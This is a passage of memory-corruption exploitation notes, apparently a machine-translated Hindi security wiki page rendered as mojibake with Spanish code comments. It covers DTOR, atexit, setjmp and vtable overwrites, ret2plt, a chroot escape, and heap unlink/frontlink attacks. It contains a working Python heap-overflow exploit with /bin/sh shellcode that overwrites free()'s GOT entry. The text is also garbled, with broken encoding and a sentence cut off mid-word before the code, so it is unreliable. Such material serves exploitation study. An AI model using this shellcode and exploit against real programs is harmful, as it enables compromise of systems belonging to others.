**рдкрд┐рдЫрд▓реЗ рдЙрддреНрдкреАрдбрд╝рди** рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдП рдФрд░ рдпрд╣ рдЕрдиреБрднрд╡ рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдЖрдк **рд╕рд╛рдордЧреНрд░реА рд▓реАрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк **`printf`** рдХреЛ рдЙрд╕ рд╕реЗрдХреНрд╢рди рдкрд░ **рд╕реЗрдЯ рдкреЙрдЗрдВрдЯрд░** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдВ **рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓** рд▓реЛрдб рд╣реЛ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ **рдкреВрд░реА рддрд░рд╣** рд╕реЗ **рдбрдВрдк** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ!

### **DTOR**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ рдбреАрдЯреАрдУрдЖрд░ рдЦрдВрдб рдХреЗ рд╕рд╛рде рдкрд╛рдирд╛ рдмрд╣реБрдд **рдЕрдЬреАрдм** рд╣реИред
{% endhint %}

рдбрд┐рд╕реНрдЯреНрд░рдХреНрдЯрд░ рд╡реЗ рдлрд╝рдВрдХреНрд╢рди рд╣реИрдВ рдЬреЛ **рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреЗ рд╣реИрдВ**ред\
рдпрджрд┐ рдЖрдк **рдПрдХ рд╢реИрд▓рдХреЛрдб** рдореЗрдВ **рдПрдбреНрд░реЗрд╕** рд▓рд┐рдЦрдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ **`__DTOR_END__`** , рддреЛ рд╡рд╣ **рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрдЧрд╛ред\
рдЗрд╕ рд╕реЗрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep тАЬ__DTORтАЭ
```
рдЖрдо рддреМрд░ рдкрд░ рдЖрдкрдХреЛ **DTOR** рдЦрдВрдб **`ffffffff` рдФрд░ `00000000`** рдХреЗ рдордзреНрдп рдореЗрдВ рдкрд╛рдПрдВрдЧреЗред рддреЛ рдЕрдЧрд░ рдЖрдк рд╕рд┐рд░реНрдл рдЙрди рдорд╛рдиреЛрдВ рдХреЛ рджреЗрдЦрддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдХреЛрдИ рдлрд╝рдВрдХреНрд╢рди рд░рдЬрд┐рд╕реНрдЯрд░ рдирд╣реАрдВ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП **`00000000`** рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдЯ** рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ **рд╢реЗрд▓рдХреЛрдб рдХреЗ рдкрддреЗ** рдХреЗ рд╕рд╛рде рдмрджрд▓ рджреЗрдВ рддрд╛рдХрд┐ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

### **рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдореЗрдВ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕**

**sprintf** рдПрдХ рдлреЙрд░реНрдореЗрдЯреЗрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдПрдХ **рд╡реЗрд░рд┐рдПрдмрд▓ рдореЗрдВ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рдЖрдк рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ **рдлреЙрд░реНрдореЗрдЯрд┐рдВрдЧ** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рд╡реЗрд░рд┐рдПрдмрд▓ рдореЗрдВ **рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ** рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреЗрд▓реЛрдб `%.44xAAAA` рд╡реЗрд░рд┐рдПрдмрд▓ рдореЗрдВ **44B+"AAAA" рд▓рд┐рдЦреЗрдЧрд╛**, рдЬрд┐рд╕рд╕реЗ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### **\_\_atexit рд╕рдВрд░рдЪрдирд╛рдПрдБ**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдЗрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдирд╛ рдмрд╣реБрдд **рдЕрдЬреАрдм** рд╣реИред
{% endhint %}

**`atexit()`** рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рдиреЗрдВ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХреА рдЬрд╛рддреА рд╣реИрдВ**ред рдпреЗ **рдлрд╝рдВрдХреНрд╢рдиреЗрдВ** рдЬрдм **`exit()`** рдпрд╛ **рдореБрдЦреНрдп** рдХрд╛ **рд╡рд╛рдкрд╕реА** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЪрд▓рд╛рдИ рдЬрд╛рдПрдВрдЧреАред\
рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рднреА рдЗрди **рдлрд╝рдВрдХреНрд╢рдиреЛрдВ** рдХреЗ **рдкрддреЗ** рдХреЛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╢реЗрд▓рдХреЛрдб рдХреА рдУрд░ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдХрд╛ **рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд** рдХрд░реЗрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдпрд╣ рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реИред\
рд╡рд░реНрддрдорд╛рди рдореЗрдВ **рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд┐рдП рдЧрдП рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ** рдХрдИ рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЗ рдкреАрдЫреЗ рдЫрд┐рдкреЗ рд╣реБрдП рд╣реИрдВ рдФрд░ рдЕрдВрдд рдореЗрдВ рдЬрд┐рди рдкрддреЛрдВ рдХреА рдУрд░ рдпрд╣ рдкреЙрдЗрдВрдЯ рдХрд░рддрд╛ рд╣реИ, рд╡реЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЛрдВ рдирд╣реАрдВ рд╣реИрдВ, рдмрд▓реНрдХрд┐ **XOR** рдФрд░ **рд░реИрдВрдбрдо рдХреБрдВрдЬреА** рдХреЗ рд╕рд╛рде **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб** рд╣реИрдВред рдЗрд╕рд▓рд┐рдП рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдпрд╣ рд╣рдорд▓рд╛ рд╡реЗрдХреНрдЯрд░ **рдХрдо рдЙрдкрдпреЛрдЧреА рд╣реИ рдХрдо рд╕реЗ рдХрдо x86** рдФрд░ **x64\_86** рдкрд░ред\
**рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдлрд╝рдВрдХреНрд╢рди** рд╣реИ **`PTR_MANGLE`**ред **рдЕрдиреНрдп рд╡рд╛рд╕реНрддреБрдХрд▓рд╛** рдЬреИрд╕реЗ m68k, mips32, mips64, aarch64, arm, hppa... **рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди** рдлрд╝рдВрдХреНрд╢рди рдХреЛ **рдирд╣реАрдВ рд▓рд╛рдЧреВ** рдХрд░рддреЗ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **рдЙрд╕реА** рд░реВрдк рдореЗрдВ рд▓реМрдЯрд╛рддрд╛ рд╣реИ рдЬреИрд╕рд╛ рдХрд┐ рдЗрд╕реЗ рдЗрдирдкреБрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдЗрд╕рд▓рд┐рдП рдЗрди рд╡рд╛рд╕реНрддреБрдХрд▓рд╛рдУрдВ рдкрд░ рдпрд╣ рд╡реЗрдХреНрдЯрд░ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдЖрдХреНрд░рдордг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### **setjmp() & longjmp()**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдЗрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдирд╛ рдмрд╣реБрдд **рдЕрдЬреАрдм** рд╣реИред
{% endhint %}

**`Setjmp()`** рдХреЛ **рд╕рдВрджрд░реНрдн** (рд░рдЬрд┐рд╕реНрдЯрд░) рдХреЛ **рдмрдЪрд╛рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ\
**`longjmp()`** рдХреЛ **рд╕рдВрджрд░реНрдн** (рд░рдЬрд┐рд╕реНрдЯрд░) рдХреЛ **рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред\
**рдмрдЪрд╛рдП рдЧрдП рд░рдЬрд┐рд╕реНрдЯрд░** рд╣реИрдВ: `EBX, ESI, EDI, ESP, EIP, EBP`\
рдпрд╣ рд╣реИ рдХрд┐ EIP рдФрд░ ESP рдХреЛ **`PTR_MANGLE`** рдлрд╝рдВрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рдкрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП **рд╡рдиреНрдп** рд╡рд░реНрддрдорд╛рди рд╡рд╣реА рд╣реИрдВ рдЬреИрд╕реЗ рдКрдкрд░ рд╡рд╛рд▓реЗред\
рдпреЗ рддреНрд░реБрдЯрд┐ рд╕реБрдзрд╛рд░ рдпрд╛ рдЕрдВрддрд░реНрд░реБрдкреНрддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИрдВред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЬрд┐рд╕реЗ рдореИрдВрдиреЗ рдкрдврд╝рд╛ рд╣реИ, рдЕрдиреНрдп рд░рдЬрд┐рд╕реНрдЯрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реИрдВ, **рддреЛ рдпрджрд┐ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рднреАрддрд░ `call ebx`, `call esi` рдпрд╛ `call edi`** рд╣реИ, рддреЛ рдирд┐рдпрдВрддреНрд░рдг рд╣рд╛рд╕рд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╛ рдЖрдк рдпрд╣ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ EBP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ рддрд╛рдХрд┐ ESP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

**VTable рдФрд░ VPTR in C++**

рдкреНрд░рддреНрдпреЗрдХ рдХреНрд▓рд╛рд╕ рдХреЗ рдкрд╛рд╕ рдПрдХ **Vtable** рд╣реЛрддреА рд╣реИ рдЬреЛ **рдореЗрдердбреНрд╕ рдХреЗ рдкреЙрдЗрдВрдЯрд░реНрд╕ рдХрд╛ рдПрдХ рдПрд░реЗ** рд╣реЛрддрд╛ рд╣реИред

рдкреНрд░рддреНрдпреЗрдХ **рдХреНрд▓рд╛рд╕** рдХрд╛ рдкреНрд░рддрд┐ **рд╡рд╕реНрддреБ** рдПрдХ **VPtr** рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЙрд╕рдХреА рдХреНрд▓рд╛рд╕ рдХреЗ рдПрд░реЗ рдХрд╛ **рдкреЙрдЗрдВрдЯрд░** рд╣реЛрддрд╛ рд╣реИред VPtr рдкреНрд░рддреНрдпреЗрдХ рд╡рд╕реНрддреБ рдХреЗ рд╣реЗрдбрд░ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ **VPtr** рдХрд╛ **рдУрд╡рд░рд░рд╛рдЗрдЯ** рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдпрд╣ **рд╕рдВрджрд░реНрднрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдбрдореА рдореЗрдердб рдХреА рдУрд░ рдЬрд╛рдПрдЧрд╛ред

## **рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ рдФрд░ рдЯрд╛рд▓рдиреЗ рдХреЗ рдЙрдкрд╛рдп**

###

**рд▓рд┐рдмрд╕реЗрдл рдХреА рдЬрдЧрд╣**

рдЗрд╕реЗ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: LD\_PRELOAD=/lib/libsafe.so.2\
рдпрд╛\
тАЬ/lib/libsave.so.2тАЭ > /etc/ld.so.preload

рдХреБрдЫ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рд╕реЗ рдЕрдВрддрд░реНрдЧрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рдЕрдВрддрд░реНрдЧрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдорд╛рдирдХреАрдХреГрдд рдирд╣реАрдВ рд╣реИред (рдХреЗрд╡рд▓ x86 рдХреЗ рд▓рд┐рдП, -fomit-frame-pointer рдХреЗ рд╕рд╛рде рдирд╣реАрдВ, рд╕реНрдереИрддрд┐рдХ рдХрдВрдкрд╛рдЗрд▓реЗрд╢рди рдХреЗ рд╕рд╛рде рдирд╣реАрдВ, рд╕рднреА рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рди рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рдмрдирддреЗ рд╣реИрдВ рдФрд░ LD\_PRELOAD рд╕реБрдЗрдб рд╡рд╛рд▓реЗ рдмрд╛рдЗрдирд░реА рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ)ред

**рдПрдПрд╕рд╕реАрдЖрдИ рдЖрд░реНрдорд░реНрдб рдПрдбреНрд░реЗрд╕ рд╕реНрдкреЗрд╕**

рдпрд╣ 0x00000000 рд╕реЗ 0x00ffffff рддрдХ рд╢реЗрдпрд░реНрдб рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рд╣реИ рддрд╛рдХрд┐ рд╣рдореЗрд╢рд╛ рдПрдХ 0x00 рдмрд╛рдЗрдЯ рд╣реЛред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдХрд┐рд╕реА рднреА рд╣рдорд▓реЗ рдХреЛ рд▓рдЧрднрдЧ рд░реЛрдХрддрд╛ рдирд╣реАрдВ рд╣реИ, рдФрд░ рдЫреЛрдЯреЗ рдЗрдВрдбрд┐рдпрди рдореЗрдВ рдХрдоред

**ret2plt**

рдЗрд╕рдореЗрдВ рдПрдХ ROP рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ plt рдХреА рдлрд╝рдВрдХреНрд╢рди strcpy@plt рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдП рдФрд░ GOT рдХреЗ рдкреНрд░рд╡реЗрд╢ рдкрд░ рдЗрд╢рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рдП рдФрд░ рд╡рд╣рд╛рдБ рд╕реЗ рдЬрд┐рд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрд╣рд▓рд╛ рдмрд╛рдЗрдЯ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рд╣реИ (system())ред рдЗрд╕рдХреЗ рдмрд╛рдж рдпрд╣реА рдХрд╛рдо GOT+1 рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ system() рдХрд╛ 2рд╡рд╛рдВ рдмрд╛рдЗрдЯ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ... рдЕрдВрдд рдореЗрдВ GOT рдореЗрдВ рд╕рд╣реЗрдЬреА рдЧрдИ рдкрддрд╛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ system() рд╣реЛрдЧрд╛ред

**chroot() рдХреЗ рд╕рд╛рде рдЬреЗрд▓**

debootstrap -arch=i386 hardy /home/user тАФ> рдПрдХ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рддрд╣рдд рдПрдХ рдмреБрдирд┐рдпрд╛рджреА рд╕рд┐рд╕реНрдЯрдо рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ

рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЗрди рдЬреЗрд▓реЛрдВ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддрд╛ рд╣реИ: mkdir foo; chroot foo; cd ..

**рдХреЛрдб рдХрд╛ рдЙрдкрдХрд░рдг**

Valgrind тАФ> рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 рд╣реАрдк рдУрд╡рд░рдлреНрд▓реЛ: рдореВрд▓ рдЙрддреНрдкреАрдбрд╝рди**

**рдЖрд╡рдВрдЯрд┐рдд рдЦрдВрдб**

рдкрд┐рдЫрд▓рд╛_рдЖрдХрд╛рд░ |\
рдЖрдХрд╛рд░ | тАФрд╣реЗрдбрд░\
\*рдореЗрдо | рдбреЗрдЯрд╛

**рдлреНрд░реА рдЦрдВрдб**

рдкрд┐рдЫрд▓рд╛_рдЖрдХрд╛рд░ |\
рдЖрдХрд╛рд░ |\
\*fd | рдкреАрдЯреАрдЖрд░ рдлреЙрд░рд╡рд░реНрдб рдЪрдВрдХ рдХрд╛ рдкрддрд╛\
\*bk | рдкреАрдЯреАрдЖрд░ рдмреИрдХ рдЪрдВрдХ рдХрд╛ рдкрддрд╛ тАФрд╣реЗрдбрд░\
\*рдореЗрдо | рдбреЗрдЯрд╛

рдлреНрд░реА рдЪрдВрдХреНрд╕ рдПрдХ рдбрдмрд▓ рд▓рд┐рдВрдХреНрдб рд▓рд┐рд╕реНрдЯ рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВ (рдмрд┐рди) рдФрд░ рдХрднреА рднреА рджреЛ рдлреНрд░реА рдЪрдВрдХреНрд╕ рд╕рд╛рде рдореЗрдВ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреЗ (рд╡реЗ рдорд┐рд▓ рдЬрд╛рддреЗ рд╣реИрдВ)

"рдЖрдХрд╛рд░" рдореЗрдВ рдмрд┐рдЯ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░рддреЗ рд╣реИрдВ: рдпрджрд┐ рдкрд┐рдЫрд▓рд╛ рдЪрдВрдХ рдЗрд╕реНрддреЗрдорд╛рд▓ рдореЗрдВ рд╣реИ, рдпрджрд┐ рдЪрдВрдХ рдХреЛ mmap() рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдпрджрд┐ рдЪрдВрдХ рдкреНрд░рд╛рдердорд┐рдХ рдПрд░реАрдирд╛ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИред

рдпрджрд┐ рдХрд┐рд╕реА рдЪрдВрдХ рдХреЛ рдореБрдХреНрдд рдХрд░рддреЗ рд╕рдордп рдХреЛрдИ рднреА рд╕рдВрдмрдВрдзрд┐рдд рдЪрдВрдХ рдореБрдХреНрдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпреЗ рдореИрдХреНрд░реЛ unlink() рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдорд┐рд▓рд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рдирдпрд╛ рдмрдбрд╝рд╛ рдЪрдВрдХ рдлреНрд░рдВрдЯрд▓
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<IтАЭ, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est├б libre est├й a 1**

**fake\_size = pack("\<IтАЭ, 0xfffffffc) #-4, para que piense que el тАЬsizeтАЭ del 3┬║ trozo est├б 4bytes detr├бs (apunta a prev\_size) pues es ah├н donde mira si el 2┬║ trozo est├б libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci├│n de free() en la plt-12 (ser├б la direcci├│n que se sobrescrita para que se lanza la shellcode la 2┬║ vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s├н**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2┬║ trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

рд╣рдо 3 рд▓рдЧрд╛рддрд╛рд░ рдЯреБрдХрдбрд╝реЛрдВ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЙрд╕реА рдХреНрд░рдо рдореЗрдВ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЖрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ:

рдЪрдВрдХ c рдореЗрдВ рд╢реЗрд▓рдХреЛрдб рдбрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ

рдЪрдВрдХ a рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдо b рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдХрд╛рд░ рдореЗрдВ рдкрд┐рдЫрд▓реЗ_рдЗрдиреНрдпреВрдЬрд╝ рдмрд┐рдЯ рдирд┐рд╖реНрдХреНрд░рд┐рдп рд╣реЛ рдЬрд╛рдП рдФрд░ рдЪрдВрдХ a рдореБрдХреНрдд рд╣реИ рдРрд╕рд╛ рд╕реЛрдЪреЗред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рд╣реЗрдбрд░ b рдореЗрдВ рдЖрдХрд╛рд░ рдХреЛ -4 рдХреЗ рд▓рд┐рдП рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╕реЛрдЪреЗрдЧрд╛ рдХрд┐ "a" рдореБрдХреНрдд рд╣реИ рдФрд░ рдПрдХ рдмрд┐рди рдореЗрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╡рд╣ unlink() рдХреЛ рдмреБрд▓рд╛рдПрдЧрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреНрдпреЛрдВрдХрд┐ рд╣реЗрдбрд░ рдкрд┐рдЫрд▓реЗ_рдЖрдХрд╛рд░ -4 рд╣реИред рд╡рд╣ рд╕реЛрдЪреЗрдЧрд╛ рдХрд┐ "a" рдХрд╛ рдЯреБрдХрдбрд╝рд╛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ b+4 рдореЗрдВ рд╢реБрд░реВ рд╣реЛ рд░рд╣рд╛ рд╣реИред рдЕрд░реНрдерд╛рдд, рд╡рд╣ рдЙрд╕ рдЯреБрдХрдбрд╝реЗ рдХреЛ рдЕрдирд▓рд┐рдВрдХ() рдХрд░реЗрдЧрд╛ рдЬреЛ b+4 рдореЗрдВ рд╢реБрд░реВ рд╣реЛ рд░рд╣рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП b+12 рдореЗрдВ рдкреЙрдЗрдВрдЯрд░ "fd" рд╣реЛрдЧрд╛ рдФрд░ b+16 рдореЗрдВ рдкреЙрдЗрдВрдЯрд░ "bk" рд╣реЛрдЧрд╛ред

рдЗрд╕ рддрд░рд╣, рдпрджрд┐ рд╣рдо bk рдореЗрдВ рд╢реЗрд▓рдХреЛрдб рдХрд╛ рдкрддрд╛ рдФрд░ fd рдореЗрдВ "puts()" рдХреЗ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ -12 рдбрд╛рд▓рддреЗ рд╣реИрдВ, рддреЛ рд╣рдорд╛рд░реЗ рдкреЗрд▓реЛрдб рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

**рдлреНрд░рдВрдЯрд▓рд┐рдВрдХ рддрдХрдиреАрдХ**

рдЬрдм рдХреБрдЫ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЙрд╕рдХреЗ рдХреЛрдИ рднреА рд╕рдВрдмрдВрдзрд┐рдд рдЯреБрдХрдбрд╝реЗ рдореБрдХреНрдд рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ unlink() рдХреЛ рдирд╣реАрдВ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдмрд▓реНрдХрд┐ рд╕реАрдзреЗ frontlink() рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЙрд╕рдХрд╛ рдЙрдкрдпреЛрдЧреА рджреЛрд╖ рдЬрдм malloc рдЬрд┐рд╕ рдкрд░ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрднреА рдореБрдХреНрдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (free())ред

рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:

